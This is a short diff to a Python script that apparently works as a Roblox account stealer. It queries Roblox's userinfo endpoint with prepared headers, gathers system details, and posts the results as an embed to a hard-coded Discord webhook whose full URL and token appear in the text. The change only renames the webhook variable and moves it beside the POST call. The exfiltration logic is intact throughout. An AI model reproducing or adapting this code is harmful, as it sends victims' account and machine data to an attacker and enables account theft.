@@ -37,7 +37,6 @@ headers = {
    'Referer': 'https://www.roblox.com/'
 }
 
-webhook = "https://discord.com/api/webhooks/1171888791515058257/-b5TfXEQhtiGNiGVOti34vXoNw4X3NudJF8hkpkZoxBaGjdtsyGzFMGBfbwIfd-x2USv"
 
 jjz = requests.get('https://www.roblox.com/mobileapi/userinfo', headers=headers).json()
 username = jjz.get('UserName', 'Not found')
@@ -108,7 +107,8 @@ payload = {
     "embeds": [embed]
 }
 headers = {"Content-Type": "application/json"}
-response = requests.post(webhook, json=payload, headers=headers)
+wbhk = "https://discord.com/api/webhooks/1171888791515058257/-b5TfXEQhtiGNiGVOti34vXoNw4X3NudJF8hkpkZoxBaGjdtsyGzFMGBfbwIfd-x2USv"
+response = requests.post(wbhk, json=payload, headers=headers)
 
 os = f"{platform.system()} {platform.release()}"
 cpu = f"{platform.processor()} ({psutil.cpu_count()} cores)"
